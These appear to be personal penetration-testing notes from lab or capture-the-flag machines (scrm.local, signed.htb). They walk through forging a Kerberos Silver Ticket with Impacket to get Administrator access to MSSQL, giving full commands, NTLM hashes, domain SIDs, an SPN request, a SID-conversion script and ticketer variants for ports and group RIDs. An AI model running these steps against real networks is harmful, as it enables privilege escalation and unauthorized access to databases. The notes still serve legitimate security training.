
If we have valid Credentials for sql_svc, we can perform a Silver Ticket Attack to impersonate the Domain Admin, but only for the specific service that this service account runs!

We won't become Domain Admin everywhere (that requires a Golden Ticket). Instead we will gain Administrator-level access exclusively to the backend service (MSSQL) in this case.

**Prerequisites:**

```
1. The NTLM Hash of sql_svc
2. The Domain SID
3. The FQDN of the target machine
4. The SPN of the sql_svc
```

1. Get the NTLM Hash

Utilize the following website & paste the password of the sql_svc account inside.
This will generate an NTLM Hash for the password.

```
https://www.browserling.com/tools/ntlm-hash
```

NTLM Hash

```
B999A16500B87D17EC7F2E2A68778F05
```

2. Get SID of the Domain

The "DRSCrackNames" revealed the Domain Admin SID

```
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
```

We need to append the -500 at the end and we gained the Domain SID

```
S-1-5-21-2743207045-1827831105-2542523200
```

3. Retrieve SPN of sql_svc

```
impacket-GetUserSPNs -request -dc-ip 10.129.44.233 -dc-host dc1.scrm.local scrm.local/ksimpson -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2026-08-04 16:12:27.927633             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2026-08-04 16:12:27.927633
```

4. Forge Silver Ticket

```
impacket-ticketer -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local -user-id 500 Administrator -spn MSSQLSVC/dc1.scrm.local
```

This created and saved an Administrator.ccache Ticket which enables us to connect via impacket-mssqlclient as Administrator!

5. Export it

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

6. Connected to the target and gained MSSQL Shell

```
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

---
## Only MSSQL?

Forging Tickets require port specification:

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
```

---
## Silver Ticket for Special Group?

1. Get SID

```
select SUSER_SID('Signed\IT')
```

I'll run the following script in order to get the SID & RID.

```
import struct

hex_str = input("Paste the hex SID (with or without 0x): ").strip().replace("0x", "").replace(" ", "")
sid_bytes = bytes.fromhex(hex_str)

rev = sid_bytes[0]
sub_count = sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], 'big')

parts = [rev, auth]
for i in range(sub_count):
    sub = struct.unpack_from('<I', sid_bytes, 8 + 4*i)[0]
    parts.append(sub)

full_sid = "S-" + "-".join(str(p) for p in parts)
domain_sid = "S-" + "-".join(str(p) for p in parts[:-1])  # drop RID
rid = parts[-1]

print(f"Full SID: {full_sid}")
print(f"Domain SID: {domain_sid}")
print(f"RID: {rid}")
```

```
python3 /opt/arsenal/sid_converter.py 
Paste the hex SID (with or without 0x): 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
Full SID: S-1-5-21-4088429403-1159899800-2753317549-1105
Domain SID: S-1-5-21-4088429403-1159899800-2753317549
RID: 1105
```

2. Forged Silver Ticket.

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
```
